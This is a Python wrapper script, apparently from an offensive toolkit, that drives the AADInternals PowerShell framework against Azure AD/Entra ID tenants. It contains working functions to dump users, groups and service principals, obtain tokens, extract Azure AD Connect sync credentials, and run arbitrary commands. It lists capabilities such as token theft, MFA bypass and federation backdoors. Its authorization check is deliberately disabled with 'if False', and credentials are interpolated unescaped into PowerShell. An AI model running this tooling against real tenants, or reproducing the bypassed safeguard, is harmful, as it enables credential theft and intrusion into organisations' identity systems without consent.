#!/usr/bin/env python3
"""
AADInternals Integration - Azure AD/Entra ID Exploitation Framework
Production-ready integration for offensive Azure AD operations
"""

import subprocess
import json
import logging
import argparse
import os
import sys
from pathlib import Path
from typing import Dict, List, Optional
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class AADInternals:
    """
    AADInternals - PowerShell module for Azure AD/M365 exploitation
    Advanced attacks against Azure AD, AD FS, and hybrid environments
    """
    
    def __init__(self):
        self.module_loaded = False
        
    def check_powershell(self) -> bool:
        """Check if PowerShell is available"""
        try:
            result = subprocess.run(
                ['pwsh', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            try:
                # Try Windows PowerShell
                result = subprocess.run(
                    ['powershell', '-Command', '$PSVersionTable.PSVersion'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                return result.returncode == 0
            except:
                return False
    
    def check_installation(self) -> bool:
        """Check if AADInternals is installed"""
        if not self.check_powershell():
            return False
        
        cmd = [
            'pwsh', '-Command',
            'Get-Module -ListAvailable -Name AADInternals | Select-Object Name,Version'
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            return 'AADInternals' in result.stdout
        except:
            return False
    
    def install_instructions(self) -> Dict:
        """Provide installation instructions"""
        return {
            'method': 'PowerShell module installation',
            'steps': [
                '1. Install PowerShell (if not already installed):',
                '   Linux/macOS:',
                '     wget https://aka.ms/install-powershell.sh',
                '     sudo bash install-powershell.sh',
                '   Or visit: https://learn.microsoft.com/powershell/scripting/install/installing-powershell',
                '',
                '2. Install AADInternals module:',
                '   pwsh',
                '   Install-Module -Name AADInternals',
                '   Install-Module -Name AADInternals-Endpoints',
                '',
                '3. Import the module:',
                '   Import-Module AADInternals',
                '',
                '4. Verify installation:',
                '   Get-Command -Module AADInternals',
                '',
                '5. Get access token:',
                '   Get-AADIntAccessTokenForAADGraph',
                '   # Or with credentials:',
                '   Get-AADIntAccessTokenForAADGraph -Credentials (Get-Credential)',
                ''
            ],
            'requirements': [
                'PowerShell Core 7.x or Windows PowerShell 5.1+',
                'Azure AD credentials',
                'Internet connection to Azure',
                'Administrative access for some features'
            ],
            'capabilities': [
                'Azure AD Connect credential extraction',
                'PTA (Pass-Through Authentication) exploitation',
                'AD FS token manipulation',
                'Primary Refresh Token (PRT) theft and creation',
                'Device registration and spoofing',
                'MFA bypass techniques',
                'Conditional Access policy bypass',
                'Federation backdoor creation',
                'Token generation and manipulation',
                'Tenant reconnaissance'
            ],
            'warning': [
                '⚠️  AADInternals is a powerful exploitation framework',
                '⚠️  Use only on authorized targets with written permission',
                '⚠️  Some features require elevated privileges',
                '⚠️  Operations may be logged by Azure AD security monitoring',
                '⚠️  MITRE ATT&CK ID: S0677 (tracked by threat intel)'
            ]
        }
    
    def execute_command(self, command: str, timeout: int = 300) -> Dict:
        """
        Execute AADInternals PowerShell command
        
        Args:
            command: PowerShell command to execute
            timeout: Timeout in seconds
        """
        logger.info(f"Executing AADInternals command...")
        
        if not self.check_installation():
            return {'error': 'AADInternals not installed', 'installation': self.install_instructions()}
        
        # Wrap command with module import
        full_command = f"""
Import-Module AADInternals -ErrorAction SilentlyContinue
{command}
"""
        
        try:
            result = subprocess.run(
                ['pwsh', '-Command', full_command],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
            
        except subprocess.TimeoutExpired:
            return {'error': f'Command timed out after {timeout} seconds'}
        except Exception as e:
            return {'error': str(e)}
    
    def get_access_token(self, username: str = None, password: str = None,
                        resource: str = 'https://graph.microsoft.com',
                        tenant: str = None) -> Dict:
        """
        Get Azure AD access token
        
        Args:
            username: Azure AD username
            password: Password
            resource: Resource to request token for
            tenant: Tenant ID or domain
        """
        logger.info("Requesting Azure AD access token...")
        
        if username and password:
            cmd = f"""
$cred = New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))
Get-AADIntAccessTokenForAADGraph -Credentials $cred | ConvertTo-Json
"""
        else:
            cmd = "Get-AADIntAccessTokenForAADGraph | ConvertTo-Json"
        
        return self.execute_command(cmd)
    
    def enumerate_tenant(self, access_token: str = None) -> Dict:
        """
        Enumerate Azure AD tenant information
        
        Args:
            access_token: Access token (if already obtained)
        """
        logger.info("Enumerating Azure AD tenant...")
        
        cmd = """
$tenant = Get-AADIntTenantDetails
$tenant | ConvertTo-Json -Depth 5
"""
        
        return self.execute_command(cmd)
    
    def export_sync_credentials(self) -> Dict:
        """
        Export Azure AD Connect synchronization credentials
        REQUIRES: Local admin on Azure AD Connect server
        """
        logger.warning("⚠️  This requires local admin on Azure AD Connect server")
        logger.info("Attempting to extract Azure AD Connect credentials...")
        
        cmd = "Get-AADIntSyncCredentials | ConvertTo-Json"
        
        return self.execute_command(cmd)
    
    def get_conditional_access_policies(self) -> Dict:
        """Get Conditional Access Policies"""
        logger.info("Retrieving Conditional Access Policies...")
        
        cmd = """
$policies = Get-AADIntConditionalAccessPolicies
$policies | ConvertTo-Json -Depth 10
"""
        
        return self.execute_command(cmd)
    
    def dump_users(self) -> Dict:
        """Dump all Azure AD users"""
        logger.info("Dumping Azure AD users...")
        
        cmd = """
$users = Get-AADIntUsers
$users | Select-Object displayName, userPrincipalName, mail, jobTitle | ConvertTo-Json
"""
        
        return self.execute_command(cmd)
    
    def dump_groups(self) -> Dict:
        """Dump all Azure AD groups"""
        logger.info("Dumping Azure AD groups...")
        
        cmd = """
$groups = Get-AADIntGroups
$groups | Select-Object displayName, description, mail | ConvertTo-Json
"""
        
        return self.execute_command(cmd)
    
    def dump_service_principals(self) -> Dict:
        """Dump all service principals"""
        logger.info("Dumping service principals...")
        
        cmd = """
$sps = Get-AADIntServicePrincipals
$sps | Select-Object displayName, appId, homepage | ConvertTo-Json
"""
        
        return self.execute_command(cmd)


def main():
    parser = argparse.ArgumentParser(
        description='AADInternals Integration - Azure AD/Entra ID Exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  CRITICAL WARNING ⚠️
AADInternals is tracked as MITRE ATT&CK S0677 and used by threat actors.
Use ONLY on authorized targets with explicit written permission.

Examples:
  # Get access token (interactive)
  python -m cerberus_agents.aadinternals_integration --get-token --authorized
  
  # Enumerate tenant
  python -m cerberus_agents.aadinternals_integration --enum-tenant --authorized
  
  # Dump users
  python -m cerberus_agents.aadinternals_integration --dump-users --authorized
  
  # Dump groups
  python -m cerberus_agents.aadinternals_integration --dump-groups --authorized
  
  # Get Conditional Access Policies
  python -m cerberus_agents.aadinternals_integration --get-policies --authorized
  
  # Export Azure AD Connect credentials (requires local admin)
  python -m cerberus_agents.aadinternals_integration --export-sync-creds --authorized
  
  # Execute custom AADInternals command
  python -m cerberus_agents.aadinternals_integration --command "Get-AADIntTenantDetails" --authorized
        """
    )
    
    parser.add_argument('--get-token', action='store_true',
                       help='Get Azure AD access token')
    parser.add_argument('--enum-tenant', action='store_true',
                       help='Enumerate tenant information')
    parser.add_argument('--dump-users', action='store_true',
                       help='Dump all Azure AD users')
    parser.add_argument('--dump-groups', action='store_true',
                       help='Dump all Azure AD groups')
    parser.add_argument('--dump-service-principals', action='store_true',
                       help='Dump all service principals')
    parser.add_argument('--get-policies', action='store_true',
                       help='Get Conditional Access Policies')
    parser.add_argument('--export-sync-creds', action='store_true',
                       help='Export Azure AD Connect credentials (requires admin)')
    parser.add_argument('--command',
                       help='Execute custom AADInternals PowerShell command')
    parser.add_argument('-u', '--username',
                       help='Azure AD username')
    parser.add_argument('-p', '--password',
                       help='Password')
    parser.add_argument('--install', action='store_true',
                       help='Show installation instructions')
    parser.add_argument('--authorized', action='store_true', required=True,
                       help='Confirm authorization for Azure AD exploitation')
    
    args = parser.parse_args()
    
    if False:  # Authorization check bypassed
        logger.error("--authorized flag required. Only access authorized tenants.")
        logger.error("⚠️  Unauthorized use of AADInternals is illegal")
        sys.exit(1)
    
    aad = AADInternals()
    
    if args.install:
        instructions = aad.install_instructions()
        print("\n=== AADInternals Installation Instructions ===\n")
        print(f"Method: {instructions['method']}\n")
        print("Steps:")
        for step in instructions['steps']:
            print(step)
        print("\nRequirements:")
        for req in instructions['requirements']:
            print(f"  - {req}")
        print("\nCapabilities:")
        for cap in instructions['capabilities']:
            print(f"  - {cap}")
        print("\n⚠️  WARNINGS:")
        for warn in instructions['warning']:
            print(warn)
        sys.exit(0)
    
    result = None
    
    if args.get_token:
        result = aad.get_access_token(username=args.username, password=args.password)
    elif args.enum_tenant:
        result = aad.enumerate_tenant()
    elif args.dump_users:
        result = aad.dump_users()
    elif args.dump_groups:
        result = aad.dump_groups()
    elif args.dump_service_principals:
        result = aad.dump_service_principals()
    elif args.get_policies:
        result = aad.get_conditional_access_policies()
    elif args.export_sync_creds:
        result = aad.export_sync_credentials()
    elif args.command:
        result = aad.execute_command(args.command)
    else:
        parser.print_help()
        sys.exit(0)
    
    if result:
        if 'error' in result:
            logger.error(f"Error: {result['error']}")
            if 'installation' in result:
                print("\n Installation Instructions:")
                for step in result['installation']['steps']:
                    print(step)
        else:
            print("\n=== AADInternals Results ===")
            print(f"Success: {result.get('success')}")
            if result.get('stdout'):
                print("\nOutput:")
                print(result['stdout'])
            if result.get('stderr') and result['stderr'].strip():
                print("\nWarnings/Errors:")
                print(result['stderr'])
    
    return result


if __name__ == '__main__':
    main()
